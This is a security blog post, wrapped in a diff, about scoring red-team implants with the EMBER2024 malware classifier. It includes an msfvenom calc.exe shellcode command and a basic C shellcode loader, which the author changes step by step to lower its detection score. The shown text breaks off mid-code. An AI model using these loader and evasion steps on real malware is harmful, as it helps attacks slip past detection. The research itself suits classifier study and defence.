@@ -1,0 +1,1240 @@
+# https://mez0.cc/posts/evaluating-implants-with-ember/
+
+<!DOCTYPE html><html lang="en">
+
+<!-- Google tag (gtag.js) -->
+
+
+<body>
+    <div class="top-nav">
+        <a href="https://mez0.cc/" title="Home"><i class="fas fa-home" style="font-size: 16px;"></i></a>
+        <a href="https://mez0.cc/pages/about" title="About"><i class="fas fa-user" style="font-size: 16px;"></i></a>
+
+        <a href="https://pre.empt.blog/" title="pre.empt" target="_blank"><i class="fas fa-skull-crossbones" style="font-size: 16px;"></i></a>
+        <a href="https://mez0.cc/pages/papers/" title="Papers"><i class="fas fa-book" style="font-size: 16px;"></i></a>
+        <a href="https://mez0.cc/rss.xml" title="RSS Feed"><i class="fas fa-rss" style="font-size: 16px;"></i></a>
+    </div>
+
+
+    <main class="container-fluid py-5">
+        <div class="row">
+            <div class="col-lg-10 mx-auto">
+                <article>
+                    <h1 class="blog-title mb-3">Using EMBER2024 to evaluate red team implants</h1>
+                    <p class="blog-meta mb-5">26-09-2025</p>
+
+                    <h2 class="mt-5 mb-3" id="introduction">Introduction</h2>
+                    <p>
+                        A while ago I wrote a post called <a href="https://mez0.cc/posts/citadel-ember/">Citadel 2.0: Predicting Maliciousness</a>. This post was a devlog of sorts in which I discussed additions made to the project, a binary analysis framework for red-teamers: <a href="https://mez0.cc/posts/citadel/">Citadel: Binary Static Analysis Framework</a>.
+                        
+                    </p>
+                    <p>
+                        In the 2.0 post I introduced ML prediction capabilities to Citadel by incorporating EMBER. Originally, EMBER was the defining component in which I modelled the PE metadata extraction from. Around the same time, EMBER2024 was released which updated the model itself. As of writing this in 2025, it's the only model, paper, and codebase accessible to researchers that provides access to a complete dataset for malicious and benign samples. This is reflected in the paper where they say:
+                    </p>
+
+                    <blockquote class="blockquote">
+                        A lack of accessible data has historically restricted malware analysis research.
+                        
+                    </blockquote>
+
+                    <p>
+                        The paper for this can be found on arxiv: <a href="https://arxiv.org/pdf/2506.05074">EMBER2024 - A Benchmark Dataset for Holistic Evaluation of Malware Classifiers</a>
+                    </p>
+
+                    <p>
+                        Incase you dont not want to read the entire post, here are some quick references:
+                    </p>
+
+                    <ul>
+                        <li><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#ml-and-malware">Anecdotes about ML and malware</a></li>
+                        <li><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#about-ember2024">About EMBER2024</a></li>
+                        <li><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#summarising">Summarising my results</a></li>
+                        <li><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#conclusion">Conclusion and recommendations</a></li>
+                    </ul>
+
+                    <p>With all that said, the tl;dr of this blogs goal is to <em>take bad sample and make good, then learn what make bad so bad can be good</em>.</p>
+                    
+                    <h2 class="mt-5 mb-3" id="ml-and-malware">ML and Malware</h2>
+                    <p>
+                        ML is a core component of malware detection and is becoming increasingly better at detecting malware. At a high level, ML-based malware detection along two routes:
+                    </p>
+                    
+                    <ol>
+                        <li>Static analysis: Extract features from the binary itself (headers, byte histograms, imported APIs, section entropy), and train models that classify based on these features.</li>
+                        <li>Dynamic analysis: Execute the binary in a sandbox and observe what it does. API calls, system calls, memory operations, network activity, etc. The temporal sequences and interactions can encode malicious behavior that static features might hide.</li>
+                    </ol>
+
+                    <p>
+                        The first approach is what I am focusing on now. But, I want to do a quick look at the both approaches.
+                    </p>
+
+                    <h3 class="mt-5 mb-3" id="static-&amp;-structural-features">Static &amp; structural features</h3>
+                    <p>
+                        Static analyis extracts features from the binary itself, and that is what I am focusing on today. In EMBERs case, its extacting imports, exports, file metadata, and more. But more on that later.
+                    </p>
+
+                    <p>
+                        Alternate methods have been used over the years, and one common approach is to convert a sample to an image as seen in the <a href="https://www.researchgate.net/publication/361927814_AMD-CNN_Android_malware_detection_via_feature_graph_and_convolutional_neural_networks">AMD-CNN: Android malware detection via feature graph and convolutional neural networks</a> paper. In my <a href="https://github.com/mez-0/citadel">citadel</a> project, I've added this as an analysis because its quite fun to see how the sample <em>looks</em>. Side note, I am not a fan of this approach as a deterministic feature - but it will be pushed with a load more code to Citadel in the future.
+                    </p>
+
+                    <img src="https://mez0.cc/static/images/ml_classify-malware-as-image.png" alt="ML Classify Malware as Image" class="img-fluid my-4">
+
+                    <p>
+                        The above image is <a href="https://www.virustotal.com/gui/file/98d23e059269dcd397938dd2de52cae88df03608616ff0105ec0ca6e03caf57">098d23e059269dcd397938dd2de52cae88df03608616ff0105ec0ca6e03caf57</a>. When compared with a sample which has a chunk of shellcode shoved inside, this is a distinct difference.
+                    </p>
+
+                    <img src="https://mez0.cc/static/images/ml_classify_two_samples.png" alt="ML Classify Two Samples" class="img-fluid my-4">
+
+                    <p>Most notably, it has a huge void of data - likely the embedded shellcode. However, this is easily avoided if I simply stage the payload.
+                    </p>
+
+                    <h3 class="mt-5 mb-3" id="behavioural-and-dynamic-features">Behavioural and dynamic features</h3>
+
+                    <p>
+                        Behavioural and dynamic features on the otherhand, allow us to observe what it <em>does</em>. Think components like API calls, system calls, memory operations, network activity, etc. The temporal sequences and interactions can encode malicious behavior that static features might hide. A practical example of this research can be seen in <a href="https://www.researchgate.net/journal/Future-Internet-1999-5903?_tp=eyJjb250ZXh0Ijp7ImZpcnN0UGFnZSI6InNpZ251cCIsInBhZ2UiOiJwdWJsaWNhdGlvbiJ9fQ">Malware Detection Based on API Call Sequence Analysis: A Gated Recurrent Unit-Generative Adversarial Network Model Approach</a>. To quote:
+                    </p>
+                    <blockquote class="blockquote">
+                        <p class="mb-0">
+                            The GRU–GAN model demonstrated exceptional performance across multiple datasets, achieving a remarkable accuracy of 99.99%, significantly surpassing other models like BiLSTM and BiGRU. In addition to its high accuracy, the GRU-GAN model exhibited robust generalization capabilities, with a precision of 99.7%, a recall of 99.8%, and an AUC of 99% on challenging test datasets. Furthermore, it maintained low false-positive and false-negative rates, which are critical for minimizing misclassification in real-world malware detection scenarios
+                        </p>
+                        
+                    </blockquote>
+
+                    <h2 class="mt-5 mb-3" id="about-ember2024">About EMBER2024</h2>
+                        <p>
+                            Before heading into the topic, I want to summarise some information from EMBER.
+                        </p>
+
+                    <h3 class="mt-5 mb-3" id="dataset">Dataset</h3>
+                    <p>
+                        </p><p>The dataset is designed for <em>"holistic evaluation of malware classifiers"</em> by encompassing 3,238,315 files collected between September 2023 and December 2024, covering six file formats:</p>
+                        <ol>
+                            <li>Win32</li>
+                            <li>Win64</li>
+                            <li>.NET</li>
+                            <li>APK</li>
+                            <li>ELF</li>
+                            <li>PDF</li>
+                        </ol>
+
+                        <div class="row mt-4 mb-4">
+                            <div class="col-12">
+                                <div class="card">
+                                    <div class="card-body">
+                                        <h5 class="card-title mb-3">File Type Distribution</h5>
+                                        <div id="file-type-chart" style="height: 400px;"><canvas width="1888" height="400" style="display: block; box-sizing: border-box; height: 400px; width: 1888px;"></canvas></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <p>
+                            Another feature is the <em>"challenge set"</em> of 6,315 files that initially evaded detection by approximately 70 AV products on VirusTotal. The authors note:
+                        </p>
+
+                        <blockquote class="blockquote">
+                        <p class="mb-0">EMBER2024 is the first to include a collection of malicious
+                        files that initially went undetected by a set of antivirus products,
+                        creating a ‘challenge’ set to assess classifier performance against
+                        evasive malware.</p>
+                        
+                        </blockquote>
+
+                        <p>
+                            To build the dataset, the authors describe the process:
+                        </p>
+                        
+                        <blockquote class="blockquote">
+                        <p class="mb-0">On each day… I identified a set of files that were first submitted to VirusTotal on that day. For each of those files, I retrieved analysis results… within 24 hours of first submission. Then, I again queried each of those files 90 or more days after its first submission date.</p>
+                        
+                        </blockquote>
+
+                        <p>
+                            Benign files were re-scanned at least 30 days after submission to ensure accurate labelling, with the most recent AV detections applied. Another interesting note that I have personally experienced with <a href="https://pre.empt.blog/">pre.empt.blog</a> in <a href="https://pre.empt.blog/posts/static-data-exploration/">Static Data Exploration of Malware and Goodware Samples</a> is the difficulty of identifying data:
+                        </p>
+
+                        <blockquote class="blockquote">
+                        <p class="mb-0">Training and evaluating a malware classifier requires a large corpus of recently observed and well-labelled files, but sufficient data is not reasonably accessible to academics.</p>
+                        
+                        </blockquote>
+
+                        <p>
+                            The file metadata that EMBER provides as JSON objects, includes MD5, SHA-1, SHA-256, and TLSH digests for file identification, alongside timestamps, detection ratios, file types, family labels, and behavioural tags. For example, a sample JSON object includes:
+                        </p>
+                            
+                        <img src="https://mez0.cc/static/images/ember-example-json.png" alt="EMBER Example JSON" class="img-fluid my-4">
+
+                        <p>
+                            EMBER feature version 3 introduces new features, expanding the vector dimension to 2,568 (from 2,381 in version 2), or 696 for non-PE files. New features include:
+                        </p>
+
+                        <table class="table table-hover">
+                            <thead>
+                                <tr>
+                                    <th>Feature Type</th>
+                                    <th>Description</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>DOS Header Features</strong></td>
+                                    <td>All entries in the DOS header for legacy PE files.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>PE Data Directory Features</strong></td>
+                                    <td>Names, sizes, and virtual addresses of directories like debug and resource data.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Rich Header Features</strong></td>
+                                    <td>Hashed entries from the undocumented Rich header, capturing compilation metadata.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Authenticode Signature Features</strong></td>
+                                    <td>Certificate details, such as count, self-signed status, and timestamps.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>PE Parse Warning Features</strong></td>
+                                    <td>88 features tracking errors/warnings from the pefile library, useful for identifying packed or modified malicious files.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>General File Features</strong></td>
+                                    <td>File size, entropy, and the first four bytes for file type inference.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>String Features</strong></td>
+                                    <td>76 patterns for paths, URLs, registry keys, and other indicators.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        
+                        <h3 class="mt-5 mb-3" id="ember-refresher">EMBER Refresher</h3>
+
+                        <p>
+                            EMBER is a LightGBM model which I have "defined" before in the <a href="https://mez0.cc/posts/citadel-ember/#lightgbm">Citadel blog under "LightGBM"</a>. That said, its worth recapping what LightGBM is and how it works.
+                        </p>
+                    
+                        <p>
+                            I will note, however, it's difficult to talk about this topic without waterfalling into twelve subtopics and twenty-odd papers. So, if you read this section, take it with a pinch of salt and just think of it as an ML algorithm that can do ✨<em><strong>stuff</strong></em>✨. But, if you want to read more about it, you can read the <a href="https://lightgbm.readthedocs.io/en/stable/">LightGBM documentation</a>.
+                     </p>
+                     
+                     <p>
+                        Light Gradient-Boosting Machine (LightGBM) is a ML framework developed by Microsoft and it was designed for tasks like classification and ranking. It uses tree-based algorithms that grow leaf-wise, selecting the leaf with the maximum loss reduction to split, unlike level-wise growth in other frameworks like <a href="https://xgboost.readthedocs.io/en/stable/">XGBoost</a>.
+                     </p>
+                     
+                     <p>
+                        By doing so, it combines histogram-based methods and techniques like Gradient-based One-Side Sampling (GOSS) and Exclusive Feature Bundling (EFB), which make LightGBM efficient with faster training, lower memory usage, and often better accuracy. All of this makes it ideal for handling the large, and highly dimensional EMBER dataset, for malware classification. All of this was proposed in <a href="https://proceedings.neurips.cc/paper_files/paper/2017/file/6449f44a102fde848669bdd9eb6b76fa-Paper.pdf">LightGBM: A Highly Efficient Gradient Boosting Decision Tree</a>.
+                    </p>
+
+                    <p>
+                        When looking at EMBER, ROC AUC will come up, so let's define that. Receiver-operating characteristic curve (ROC) is a diagram which shows the performance of a model. It's made by calculating the TPR (True Positive Rate) and FPR (False Positive Rate) for all the thresholds.
+                    </p>
+                    
+                    <p>Then there is AUC (Area under the Curve). This represents the probability that a model with a randomly chosen positive or negative will rank the positive higher than the negative. Read more about that here: <a href="https://developers.google.com/machine-learning/crash-course/classification/roc-and-auc">Classification: ROC and AUC</a>.</p>
+
+                    <p>
+                        EMBER provides vectorized features extracted using the <a href="https://github.com/lief-project/LIEF">LIEF</a> library, which parses PE files to generate structured data. The vectorization process includes features like header information, imports/exports, section properties, byte histogram, string features, and data directories.
+                    </p>
+
+                        <div class="table-responsive">
+                            <table class="table table-bordered">
+                                <thead>
+                                    <tr>
+                                        <th>Feature</th>
+                                        <th>Description</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>Header Information</strong></td>
+                                        <td>Metadata from the PE header, such as machine type, timestamp, or number of sections.</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Imports/Exports</strong></td>
+                                        <td>Lists of imported functions or libraries, which may indicate malicious behavior (e.g., use of obfuscated imports).</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Section Properties</strong></td>
+                                        <td>Characteristics like section size, entropy, or permissions (e.g., executable sections).</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Byte Histogram</strong></td>
+                                        <td>Frequency distribution of byte values in the file.</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>String Features</strong></td>
+                                        <td>Counts or patterns of printable strings, URLs, or registry keys.</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Data Directories</strong></td>
+                                        <td>Information about resources, debug info, or certificates.</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        
+                        <h3 class="mt-5 mb-3" id="features">Features</h3>
+
+                        <p>
+                            <a href="https://github.com/FutureComputing4AI/EMBER2024/blob/main/src/thrember/features.py">features.py</a> is the data extraction component of EMBER. Specifically in the <a href="https://github.com/FutureComputing4AI/EMBER2024/blob/5d75acde049388640b848318c37edf6e6a532bce/src/thrember/features.py#L1051">PEFeatureExtractor</a> class, there are the following features:
+                        </p>
+
+<pre class="hljs-ready"><code class="language-python hljs" data-highlighted="yes">features = OrderedDict([
+    (<span class="hljs-string">"GeneralFileInfo"</span>, GeneralFileInfo()),
+    (<span class="hljs-string">"ByteHistogram"</span>, ByteHistogram()),
+    (<span class="hljs-string">"ByteEntropyHistogram"</span>, ByteEntropyHistogram()),
+    (<span class="hljs-string">"StringExtractor"</span>, StringExtractor()),
+    (<span class="hljs-string">"HeaderFileInfo"</span>, HeaderFileInfo()),
+    (<span class="hljs-string">"SectionInfo"</span>, SectionInfo()),
+    (<span class="hljs-string">"ImportsInfo"</span>, ImportsInfo()),
+    (<span class="hljs-string">"ExportsInfo"</span>, ExportsInfo()),
+    (<span class="hljs-string">"DataDirectories"</span>, DataDirectories()),
+    (<span class="hljs-string">"RichHeader"</span>, RichHeader()),
+    (<span class="hljs-string">"AuthenticodeSignature"</span>, AuthenticodeSignature()),
+    (<span class="hljs-string">"PEFormatWarnings"</span>, PEFormatWarnings(warnings_file)),
+])</code></pre>
+                        
+                        <p>
+                            Each of these feature extractors contributes a <strong>fixed-size block of values</strong> to the final feature vector. That size is defined in the <code>dim</code> variable. The overall model input is just the concatenation of all these blocks, which is why the total feature length is deterministic (2,568 for PE files in EMBER).
+                        </p>
+
+                        <p>
+                            Jumping to <a href="https://github.com/FutureComputing4AI/EMBER2024/blob/main/src/thrember/features.py#L477">ImportsInfo</a> for example:
+                        </p>
+
+                        <pre class="hljs-ready"><code class="language-python hljs" data-highlighted="yes"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ImportsInfo</span>(<span class="hljs-title class_ inherited__">FeatureType</span>):
+    <span class="hljs-string">"""
+    Information about imported libraries and functions from the
+    import address table.  Note that the total number of imported
+    functions is contained in GeneralFileInfo.
+    """</span>
+
+    name = <span class="hljs-string">"imports"</span>
+    dim = <span class="hljs-number">2</span> + <span class="hljs-number">256</span> + <span class="hljs-number">1024</span>
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-built_in">super</span>(FeatureType, self).__init__()
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">raw_features</span>(<span class="hljs-params">self, bytez, pe</span>):
+        imports = {}
+        <span class="hljs-keyword">if</span> pe <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-string">"DIRECTORY_ENTRY_IMPORT"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> pe.__dict__.keys():
+            <span class="hljs-keyword">return</span> imports
+
+        <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> pe.DIRECTORY_ENTRY_IMPORT:
+            dll_name = entry.dll.decode()
+            imports[dll_name] = []
+
+            <span class="hljs-comment"># Clipping assumes there are diminishing returns on the discriminatory power of imported functions</span>
+            <span class="hljs-comment"># beyond the first 10000 characters, and this will help limit the dataset size</span>
+            <span class="hljs-keyword">for</span> lib <span class="hljs-keyword">in</span> entry.imports:
+                <span class="hljs-keyword">if</span> lib.name <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(lib.name):
+                    imports[dll_name].append(lib.name.decode()[:<span class="hljs-number">10000</span>])
+                <span class="hljs-keyword">elif</span> lib.ordinal <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
+                    imports[dll_name].append(<span class="hljs-string">f"<span class="hljs-subst">{dll_name}</span>:ordinal<span class="hljs-subst">{lib.ordinal}</span>"</span>)
+
+        <span class="hljs-keyword">return</span> imports</code></pre>
+
+                        <p>
+                            Here <code>dim = 2 + 256 + 1024</code> defines the total number of dimensions for this feature group.
+                        </p>
+
+                        <div class="table-responsive">
+                            <table class="table table-bordered">
+                               <thead>
+                                  <tr>
+                                     <th>Feature Block</th>
+                                     <th>Dimensions</th>
+                                     <th>Description</th>
+                                  </tr>
+                               </thead>
+                               <tbody>
+                                  <tr>
+                                     <td>Simple counts</td>
+                                     <td>2</td>
+                                     <td>Number of DLLs and number of imported functions</td>
+                                  </tr>
+                                  <tr>
+                                     <td>DLL names (hashed)</td>
+                                     <td>256</td>
+                                     <td>DLL names hashed into fixed buckets</td>
+                                  </tr>
+                                  <tr>
+                                     <td>Imported function names (hashed)</td>
+                                     <td>1024</td>
+                                     <td>Function names hashed into fixed buckets</td>
+                                  </tr>
+                                  <tr>
+                                     <td><strong>Total</strong></td>
+                                     <td><strong>1282</strong></td>
+                                     <td>Sum of all dimensions in the <code>ImportsInfo</code> feature</td>
+                                  </tr>
+                               </tbody>
+                            </table>
+                         </div>
+
+                        <p>
+                            So, when the feature extractor encodes imports, it always outputs a 1,282-length subvector. That slot in the overall feature vector is reserved for imports regardless of how many DLLs or functions a given PE actually uses.
+                        </p>
+
+                        <p>
+                            This pattern repeats for all the feature groups where each defines a <code>dim</code>, the extractor fills exactly that many slots, and the concatenation across groups yields a consistent fixed-length vector that can be fed to LightGBM or any other ML model.
+                        </p>
+
+                        <div class="table-responsive">
+                            <table class="table table-bordered">
+                               <thead>
+                                  <tr>
+                                     <th>Class Name</th>
+                                     <th>Dim Value</th>
+                                  </tr>
+                               </thead>
+                               <tbody>
+                                  <tr>
+                                     <td>ImportsInfo</td>
+                                     <td>1282</td>
+                                  </tr>
+                                  <tr>
+                                     <td>ByteHistogram</td>
+                                     <td>256</td>
+                                  </tr>
+                                  <tr>
+                                     <td>ByteEntropyHistogram</td>
+                                     <td>256</td>
+                                  </tr>
+                                  <tr>
+                                     <td>StringExtractor</td>
+                                     <td>177</td>
+                                  </tr>
+                                  <tr>
+                                     <td>SectionInfo</td>
+                                     <td>174</td>
+                                  </tr>
+                                  <tr>
+                                     <td>ExportsInfo</td>
+                                     <td>129</td>
+                                  </tr>
+                                  <tr>
+                                     <td>HeaderFileInfo</td>
+                                     <td>74</td>
+                                  </tr>
+                                  <tr>
+                                     <td>DataDirectories</td>
+                                     <td>34</td>
+                                  </tr>
+                                  <tr>
+                                     <td>RichHeader</td>
+                                     <td>33</td>
+                                  </tr>
+                                  <tr>
+                                     <td>AuthenticodeSignature</td>
+                                     <td>8</td>
+                                  </tr>
+                                  <tr>
+                                     <td>GeneralFileInfo</td>
+                                     <td>7</td>
+                                  </tr>
+                               </tbody>
+                            </table>
+                         </div>
+
+                        <p>
+                            I may misunderstand this, but to me, I am interpreting this as: <em style="color:red">Of the 2568 dimensions in the model, 1282 of them are datapoints from imports.</em> Ergo, not <em>directly</em> working as weightings but they hold influence. I may be wrong, and if I am, <a href="https://x.com/__mez0__">hit me up</a>.
+                        </p>
+
+                        <h2 class="mt-5 mb-3" id="my-approach-to-the-task">My approach to the task</h2>
+                        
+                        <p>
+                            For this, there is probably a really intelligent way to take a malicious binary and make it not so. However, I made changes I think will be impactful, have EMBER give it a prediction, and go from there. But before that, I can define a few ground-rules for what I <em>need</em> the implant to do.
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/smart.gif" alt="Smart" class="img-fluid my-4">
+
+                        <p>
+                            Firstly, I need to load an implant. No need to debate the idiosyncrasies of <code>async-bof</code> vs <code>bof</code> vs <code>dll</code> vs <code>exe</code> vs <code>PIC</code>. I am going to keep it simple and simply load <code>calc.exe</code> from <a href="https://www.offsec.com/metasploit-unleashed/msfvenom/">MSFVenom</a>.
+                        </p>
+
+                        <pre class="hljs-ready"><code class="language-bash hljs" data-highlighted="yes">msfvenom -p windows/x64/exec CMD=<span class="hljs-string">"calc.exe"</span> -f c -o samples/common/buf.h</code></pre>
+                        
+                        <p>
+                            This does two things. Firstly, I load shellcode which is great. Secondly, its a highly signatured piece of data so when I want to check 
+                        it for anything malicious, I can do so.
+                        </p><p>
+
+                        </p><p>
+                            Next, I want to be able to do some sort of keying and safety checks, see my blog <a href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure">Execution Guardrails: No One Likes Unintentional Exposure</a> for more details if you are unfamiliar with the topic.
+                        </p>
+
+                        <p>
+                            Finally, I am going to build an <code>EXE</code>. EMBER focuses primarily on compiled applications so I will do that. If I were to build various loaders in scripting languages, config files which <em>accidently</em> load malware, and so on - I'd be testing on data EMBER wasn't trained on.
+                        </p>
+
+                        <p>
+                            Before writing any code, I gathered samples from my host and VMs to
+                        get a vibe for where applications were being placed by EMBER.
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/samples-predict-table.png" alt="Samples Predict Table" class="img-fluid my-4">
+
+                        <div class="row mt-4 mb-4">
+                            <div class="col-12">
+                                <div class="card">
+                                    <div class="card-body">
+                                        <h5 class="card-title mb-3">EMBER Prediction Scores</h5>
+                                        <div style="height: 400px;">
+                                            <canvas id="predictionChart" width="1888" height="400" style="display: block; box-sizing: border-box; height: 400px; width: 1888px;"></canvas>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <p>
+                            There were some standouts. Namely, <code>vgc.exe</code> went from <code>0.4563</code> right up to <code>0.9992</code> when the signature was removed. If you are unfamiliar, <code>vgc.exe</code> is the <a href="https://support-valorant.riotgames.com/hc/en-us/articles/360046160933-What-is-Vanguard">Riot Games Anti-cheat Engine</a>: Vanguard. Given the trope of anti-cheat engines and EDRs are basically just rootkits, this makes sense. Its going to be doing all kinds of bizarre things to your machine to ensure DLLs are being loaded, injection isn't occurring, and it isn't being messed with. The same thing with <code>ProcessHacker.exe</code> and the unsigned copies of <code>dbgview</code> and <code>procexp</code> - essentially anything which messes with processes and memory. This is interesting because its suggesting, to me, that imports are having an impact already.
+                        </p>
+                        
+                        <p>At the top in positions 2, 3, 4, and 5 - some basic examples of <code>mingw</code> loaders. Again, foreshadowing. Averaging this out, its around <code>0.291157692</code> which <em>feels</em> like a good starting point.
+
+                        <img src="https://mez0.cc/static/images/foreshadow.gif" alt="Foreshadow" class="img-fluid my-4">
+
+                        </p><h2 class="mt-5 mb-3" id="the-template-code-to-increment">The template code to increment</h2>
+                        
+                        <p>To begin the process, I'm going to start with this small piece of <code>c</code> which is a completely basic and average loader which simply does a <code>VirtualAlloc</code> and <code>CreateThread</code> load directly in <code>main</code>:</p>
+                        
+<pre class="hljs-ready"><code class="language-c hljs" data-highlighted="yes"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> once</span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> DEBUG_PRINT( f, ... ) { printf( <span class="hljs-string">"[%s::%d] "</span> f, __FUNCTION__, __LINE__, __VA_ARGS__ ); }</span>
+<span class="hljs-meta">#<span class="hljs-keyword">else</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> DEBUG_PRINT( f, ... ) { ; }</span>
+<span class="hljs-meta">#<span class="hljs-keyword">endif</span>% </span>
+
+<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] =
+<span class="hljs-string">"\xfc..."</span>;
+
+<span class="hljs-type">int</span> buf_len = <span class="hljs-number">510</span>;
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    LPVOID lpAddress = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    <span class="hljs-keyword">if</span> (lpAddress == <span class="hljs-literal">NULL</span>) {
+        DEBUG_PRINT(<span class="hljs-string">"VirtualAlloc failed\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    DEBUG_PRINT(<span class="hljs-string">"LpAddress: %p\n"</span>, lpAddress);
+
+    <span class="hljs-built_in">memcpy</span>(lpAddress, buf, <span class="hljs-keyword">sizeof</span>(buf));
+
+    HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)lpAddress, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+
+    <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">NULL</span>) {
+        DEBUG_PRINT(<span class="hljs-string">"CreateThread failed\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    DEBUG_PRINT(<span class="hljs-string">"hThread: %p\n"</span>, hThread);
+
+    WaitForSingleObject(hThread, INFINITE);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+
+                    <p>
+                        Then, the meat and potatoes of the predicter is this python function:
+                    </p>
+
+<pre class="hljs-ready"><code class="language-python hljs" data-highlighted="yes"><span class="hljs-keyword">def</span> <span class="hljs-title function_">predict_sample</span>(<span class="hljs-params">model_path: <span class="hljs-built_in">str</span>, file_data: <span class="hljs-built_in">bytes</span></span>) -&gt; np.ndarray:
+    <span class="hljs-string">"""
+    Predict a PE file with an LightGBM model
+
+    :param model_path: The path to the LightGBM model to use for prediction.
+    :type model_path: str
+    :param file_data: The file data to predict.
+    :type file_data: bytes
+    :return: The prediction result.
+    :rtype: np.ndarray
+    """</span>
+
+    lgbm_model = lgb.Booster(model_file=model_path)
+
+    extractor = PEFeatureExtractor()
+
+    features = np.array(extractor.feature_vector(file_data), dtype=np.float32)
+
+    predict_result = lgbm_model.predict([features])
+
+    <span class="hljs-keyword">return</span> predict_result</code></pre>
+
+                        <p>
+                            Even Defender doesn't like this which is a good sign because it means that the malicious sample is being treated as such.
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/msf-calc-detected.png" alt="MSF Calc Detected" class="img-fluid my-4">
+
+                        <p>
+                            This iteration came in at a very malicious <code>0.9985</code> which is a great starting point for me.
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/ml_classify_1.png" alt="ML Classify 1" class="img-fluid my-4">
+
+                        <h2 class="mt-5 mb-3" id="changing-the-code-bit-by-bit">Changing the code bit by bit</h2>
+
+                        <p>
+                            In my opinion, the first port of call when trying to make malware look not like malware is to make it look like software. To me, this means filling out the properties and adding the manifest and icons. That's what real software does, so the implant should too.
+                        </p>
+                            
+                            <img src="https://mez0.cc/static/images/goblin-general.png" alt="Goblin General" class="img-fluid my-4">
+                            <img src="https://mez0.cc/static/images/goblin-details.png" alt="Goblin Details" class="img-fluid my-4">
+
+                            <p>
+                                However, this ma a <code>0.01</code> difference…
+                            </p>
+
+                            <img src="https://mez0.cc/static/images/ml_classify_2.png" alt="ML Classify 2" class="img-fluid my-4">
+
+                            <p>
+                                The next really obvious step is to simply empty the <code>buf</code>. Shellcode can be loaded into a process in a million different ways, so thats what I did next.
+                            </p>
+
+                        <pre class="hljs-ready"><code class="language-c hljs" data-highlighted="yes"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <span class="hljs-string">""</span>;</code></pre>
+
+                        
+                        <p>Interestingly, about <code>0.007</code> changed.</p>
+                        
+                        <img src="https://mez0.cc/static/images/ml_classify_3.png" alt="ML Classify 3" class="img-fluid my-4">
+
+                        <p>
+                            To follow the theme of removing bits of the code until its not weird, I incrementally removed a function and ran the prediction. So, here is the code thus far:
+                        </p>
+                        
+<pre class="hljs-ready"><code class="language-c hljs" data-highlighted="yes"><span class="hljs-meta">#<span class="hljs-keyword">include</span> </span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> </span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> DEBUG_PRINT( f, ... ) { printf( <span class="hljs-string">"[%s::%d] "</span> f, __FUNCTION__, __LINE__, __VA_ARGS__ ); }</span>
+<span class="hljs-meta">#<span class="hljs-keyword">else</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> DEBUG_PRINT( f, ... ) { ; }</span>
